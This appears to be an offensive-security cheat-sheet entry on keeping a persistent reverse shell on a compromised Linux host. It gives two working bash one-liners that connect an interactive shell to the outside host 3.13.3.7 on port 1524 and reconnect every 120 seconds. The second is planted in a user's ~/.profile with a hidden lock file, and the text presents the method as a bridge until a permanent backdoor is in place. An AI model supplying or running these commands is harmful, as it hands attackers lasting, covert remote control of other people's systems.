# Background Reverse Shell

A persistent reverse shell that attempts to reconnect to our system every 120 seconds without a time limit. Frequently utilized as a temporary solution until a permanent backdoor is established, ensuring seamless re-entry into a system in the event of a disconnection from our end.

`setsid bash -c 'while :; do bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 120; done' &>/dev/null`

or the user's ~/.profile (also stops multiple instances from being started):

`fuser /dev/shm/.busy &>/dev/null || nohup /bin/bash -c 'while :; do touch /dev/shm/.busy; exec 3</dev/shm/.busy; bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 ; sleep 120; done' &>/dev/null &`
